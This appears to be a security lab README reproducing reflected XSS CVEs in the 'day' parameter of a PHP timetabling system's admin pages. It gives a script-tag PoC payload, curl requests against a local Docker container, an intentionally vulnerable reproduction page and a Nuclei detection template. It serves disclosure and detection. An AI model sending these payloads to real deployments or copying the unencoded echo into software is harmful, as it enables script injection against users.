# Class and Exam Timetabling System V1.0 — Reflected XSS (`day` parameter)

Reproduction lab + Nuclei detection for reflected XSS in SourceCodester
[Class and Exam Timetabling System](https://www.sourcecodester.com/php/11332/class-and-exam-timetabling.html)
V1.0. Multiple admin pages echo the `day` GET parameter with no output
encoding; each has its own CVE.

| CVE | Sink | Report |
| --- | --- | --- |
| CVE-2026-16485 | `admin/class.php` (`day`) | [ashfaqsharif47-arch/Web-RCE#1](https://github.com/ashfaqsharif47-arch/Web-RCE/issues/1) |
| CVE-2026-16486 | `admin/BSIS.php` (`day`)  | [kurshidheba852-hub/My-cve-repository#1](https://github.com/kurshidheba852-hub/My-cve-repository/issues/1) |

- **Type:** Reflected Cross-Site Scripting (CWE-79)
- **Auth:** none required
- **PoC payload:** `<script>prompt(/xss/);</script>`

> Note: the repo hosting the first report is named "Web-RCE", but both reported
> issues are **XSS**, not RCE.

> The SourceCodester download is gated and no public source mirror exists, so
> `www/admin/class.php` is a **minimal faithful reproduction** of the reported
> sink (the XSS reflection needs no database). It reproduces the exact code
> path and parameter from the report.

## Spawn the vulnerable app

```bash
docker build -t cet-day-xss .
docker run -d --name cet-lab -p 8099:80 cet-day-xss
```

Manual PoC (reflects the payload unescaped into the page):

```bash
# CVE-2026-16485
curl "http://127.0.0.1:8099/admin/class.php?day=%22%3E%3Cscript%3Eprompt(/xss/)%3C/script%3E"
# CVE-2026-16486
curl "http://127.0.0.1:8099/admin/BSIS.php?day=%22%3E%3Cscript%3Eprompt(/xss/)%3C/script%3E"
```

Or open in a browser to see the script execute, e.g.:
`http://127.0.0.1:8099/admin/class.php?day=<script>prompt(/xss/);</script>`

## Detect with Nuclei

```bash
# run both templates
nuclei -t nuclei/ -u http://127.0.0.1:8099
```

The template sends an **inert** unique probe (`"><ptr-xss-probe>7f3a9c` — a
custom element with no event handler) instead of an executing payload, and
matches when the un-encoded markup is reflected in an HTML `200` response.

## Cleanup

```bash
docker rm -f cet-lab
```
